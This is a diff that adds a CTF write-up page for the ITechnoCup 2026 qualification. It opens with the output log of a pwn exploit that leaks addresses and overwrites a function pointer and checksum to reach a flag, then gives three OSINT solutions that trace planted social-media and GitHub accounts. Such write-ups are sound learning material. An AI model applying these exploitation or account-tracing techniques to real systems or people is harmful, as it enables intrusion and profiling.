+if __name__ == '__main__':
+    main()</pre>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar"><span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span></div>
+          <pre>[+] Opening connection to ctf.itechnocup.id on port 39994: Done
+[*] loket0 = 0xc1d788021380
+[*] loket1 = 0xc1d788021390
+[*] checksum = 0xe44c30d9e47f238
+[*] PIE base = 0xc1d78801f960
+[*] flag() target = 0xc1d788021420
+[*] new checksum = 0x836238039e6dc976
+[*] overwriting loket[0] pointer...
+[*] overwriting checksum...
+[+] patched loket[0] + checksum confirmed
+[+] Receiving all data: Done (59B)
+[*] Closed connection to ctf.itechnocup.id port 39994
+loket[0] dipanggil
+ITECHNO26{ehhhh_its_fragnesia_bug?????}
+
+[+] FLAG: ITECHNO26{ehhhh_its_fragnesia_bug?????}</pre>
+        </div>
+        <div class="wr-flag">
+          <span class="wr-flag-label">Flag</span>
+          ITECHNO26{ehhhh_its_fragnesia_bug?????}
+        </div>
+      </article>
+    </section>
+
+    <!-- ============================== OSINT ============================== -->
+    <section class="wr-cat" id="osint">
+      <h2 class="wr-cat-title">OSINT</h2>
+
+      <article class="wr-chal" id="scroll">
+        <h3 class="wr-chal-title">
+          <span class="level level-info">INFO</span> Scroll <span style="color:var(--text-faint);font-weight:400;font-size:12px;">— 1st challenge</span>
+        </h3>
+        <div class="wr-body">
+          <p>Awalnya saya coba nyari di X.com dengan search key seperti "TechnoCup26", "HimastikPNJ", dan lain-lain, tapi selalu nemu jalan buntu. Sempat nyerah dan coba soal OSINT selanjutnya dulu.</p>
+          <p>Dari sana dapat info yang sangat membantu dari sebuah GitHub repo yang dicantumkan di challenge lain: sebuah catatan berjudul "jalan jalan Notes 2026" yang menyebut "I use the same username everywhere: <code>@s3condnyah3rwthme</code>". Karena ada "second", berarti ada "first" saya coba cari <code>@h3rwthme</code>, dan ketemu akunnya dengan deskripsi bio yang cocok dengan username yang dicari-cari.</p>
+          <p>Dari list follower-nya yang cuma empat orang, ditemukan akun <code>@hannns16</code>. Scroll ke paling bawah, ada sebuah flag di kolom reply yang format depannya kurang sesuai tinggal ganti prefix-nya dan ketemu jawabannya.</p>
+        </div>
+        <div class="wr-flag">
+          <span class="wr-flag-label">Flag</span>
+          ITECHNO26{1ni_Ad4lah_Fl3gNyAh}
+        </div>
+      </article>
+
+      <article class="wr-chal" id="rumus-kimia">
+        <h3 class="wr-chal-title">
+          <span class="level level-warn">WARN</span> Rumus Kimia <span style="color:var(--text-faint);font-weight:400;font-size:12px;">— 2nd challenge</span>
+        </h3>
+        <div class="wr-body">
+          <p>Hint: <em>"Coba itu diliat ig mimin, ig mimin sama kaya nama author-nya, bukan di akun pertama tapi cari di akun second mimin."</em></p>
+          <p>Akun "first" yang dimaksud di hint sudah diprivat, tapi di list follow-nya bisa ditemukan akun ber-username <code>@secondnyah3rwthme</code>. Isinya cuma 7 post, jadi bisa dicek satu-satu dengan mudah.</p>
+          <p>Ketemu satu post dengan rumus kimia + foto yang juga muncul di repository GitHub sebelumnya. Komentar awalnya menyebut "gas etena", tapi reply dari admin yang masih hangat memperjelas kalau rumus kimia yang dimaksud adalah gas <strong>etana</strong>, yaitu <code class="wr-hl">C2H6</code>.</p>
+          <p>Foto yang sama didapat dari salah satu branch GitHub, <code>iniadalahblog-content</code>. Dari title-nya diketahui ini foto dari Cyber Summit 2026 - Jakarta. Ditelusuri lebih lanjut ke challenge <a href="#git-happens">Git Happens</a>, ketahuan kalau Cyber Summit ini berlokasi di OMI PNJ.</p>
+        </div>
+        <div class="wr-flag">
+          <span class="wr-flag-label">Flag</span>
+          ITECHNO26{C2H6_OMIPNJ_2026}
+        </div>
+      </article>
+
+      <article class="wr-chal" id="git-happens">
+        <h3 class="wr-chal-title">
+          <span class="level level-info">INFO</span> Git Happens <span style="color:var(--text-faint);font-weight:400;font-size:12px;">— 3rd challenge</span>
+        </h3>
+        <div class="wr-body">
+          <p>Repo GitHub <code>s3condnyah3rwthme/portofolio</code> punya beberapa branch: <code>main</code>, <code>wifi-tools</code>, <code>jalanjalan-notes</code>, dan <code>iniadalahblog-content</code>.</p>
+          <p>Di branch <code>wifi-tools</code>, tepatnya di <code>RELEASES/v0.1.0-conference-photos.md</code>, ada rilis "Release v0.1.0 - conference_photos.zip" dengan isi <code>ssid.jpg</code> (PNJ-H0tspot Co. booth) dan <code>tempat.jpg</code> (OM1PNJ entrance sign), dengan catatan foto-foto ini diambil di Cyber Summit 2026.</p>
+          <p>Mengingat format flag yang diberikan panitia <code>ITECHNO26{LANpnj_Tempatpnj_Tahun}</code> tinggal disusun sesuai yang tertulis di rilis tersebut.</p>
+        </div>
+        <div class="wr-flag">
+          <span class="wr-flag-label">Flag</span>
+          ITECHNO26{PNJ-H0tspot_OM1PNJ_2026}
+        </div>
+      </article>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <a class="wr-back" href="../index.html">← kembali ke ~/trace</a>
+    <div class="footer-meta">ITechnoCup 2026 CTF Qualification — Team BOEDOET AK DRAGON 47 (sinsrakzz, KiiOrg, HansRajin)</div>
+  </footer>
+</body>
+</html>
